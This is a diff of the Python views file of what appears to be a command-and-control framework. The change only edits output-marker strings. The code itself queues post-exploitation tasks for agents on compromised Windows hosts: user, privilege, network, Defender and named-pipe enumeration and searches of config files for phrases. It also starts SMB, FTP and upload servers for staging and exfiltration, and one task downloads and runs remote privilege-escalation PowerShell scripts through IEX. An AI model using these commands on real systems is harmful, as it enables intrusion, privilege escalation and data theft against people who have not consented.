@@ -20,7 +20,7 @@ def DirectoryListing(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         path = request.POST['path']
-        task = 'echo "++++++++++++++++++`r`n`t`r`n`t";ls {};echo "++++++++++++++++++`r`n`t`r`n"'.format(path)
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n";ls {};echo "`r`n`t`r`n`r`n`t`r`n"'.format(path)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -38,7 +38,7 @@ def Applocker(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker_Policy_Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker_Policy_Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -214,7 +214,7 @@ def open_pythonserver(request):
         directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============Python_Server_For_{0}_seconds_>>_{1}==============='; timeout {0} python -m http.server {3} --directory {2} &".format(timeout,result_path,directory,serverport))
+        os.system("echo '.`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Python_Server_For_{0}_seconds_>>_{1}==============='; timeout {0} python -m http.server {3} --directory {2} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -232,7 +232,7 @@ def open_SMBserver(request):
         directory = request.POST['directory'] ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============SMB_Server_For_{0}_seconds>>_{1}==============='; timeout {0} impacket-smbserver share -smb2support {2} -port {3} &".format(timeout,result_path,directory,serverport))
+        os.system("echo '.`r`n`t`r`nC2nan:#/`r`n`t`r`n===============SMB_Server_For_{0}_seconds>>_{1}==============='; timeout {0} impacket-smbserver share -smb2support {2} -port {3} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -250,7 +250,7 @@ def open_FTPserver(request):
         directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} &".format(timeout,result_path,directory,serverport))
+        os.system("echo '.`r`n`t`r`nC2nan:#/`r`n`t`r`n===============FTP_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')    
@@ -269,7 +269,7 @@ def open_PY_UploadServer(request):
         directory = request.POST['directory'] ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m uploadserver --port {3} --directory {2} --write &;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
+        os.system("echo '.`r`n`t`r`nC2nan:#/`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m uploadserver --port {3} --directory {2} --write &;echo '`r`n`t`r`n`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')                                               
@@ -288,7 +288,7 @@ def open_FTP_UploadServer(request):
         directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} --write &;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
+        os.system("echo '.`r`n`t`r`nC2nan:#/`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} --write &;echo '`r`n`t`r`n`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -302,7 +302,7 @@ def env_var(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -321,7 +321,7 @@ def Phrase_finder(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         phrase = request.POST['phrase']
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml;echo "++++++++++++++++++`r`n`t`r`n"'.format(phrase , phrase)
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml;echo "`r`n`t`r`n`r`n`t`r`n"'.format(phrase , phrase)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -341,7 +341,7 @@ def IPsWindows(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Interface_IP_and_DNS_information===============";ipconfig /all; echo "===============arp_table_information===============";arp -a;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Interface_IP_and_DNS_information===============";ipconfig /all; echo "===============arp_table_information===============";arp -a;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -360,7 +360,7 @@ def logged_users(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============LoggedIn_users===============";query user;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============LoggedIn_users===============";query user;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -378,7 +378,7 @@ def Net_Connections(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Network_connections===============";netstat -ano;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Network_connections===============";netstat -ano;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -396,7 +396,7 @@ def Programs(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -415,7 +415,7 @@ def processes(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes==============="; ;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Running_processes==============="; ;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -456,7 +456,7 @@ def winuser_info(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -474,7 +474,7 @@ def Systeminfo(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -495,7 +495,7 @@ def UpdatesWindows(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -535,7 +535,7 @@ def WinDefStat(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -554,7 +554,7 @@ def Named_pipes(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -571,7 +571,7 @@ def Perm_pip(request , agent='',named_pip_name=''):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v;echo "++++++++++++++++++`r`n`t`r`n"'.format(named_pip_name)
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v;echo "`r`n`t`r`n`r`n`t`r`n"'.format(named_pip_name)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -653,7 +653,7 @@ def tasklist (request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task_List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Task_List===============";tasklist;echo "`r`n`t`r`n`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
@@ -886,7 +886,7 @@ def enable_all_privilleges(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN==============="; IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/Enable-Privilege.ps1");IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/EnableAllTokenPrivs.ps1");whoami /priv;echo "++++++++++++++++++`r`n"'.format(ip)
+        task= 'echo ".`r`n`t`r`nC2nan:#/`r`n`t`r`n===============Createing Fake SPN==============="; IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/Enable-Privilege.ps1");IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/EnableAllTokenPrivs.ps1");whoami /priv;echo "`r`n"'.format(ip)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
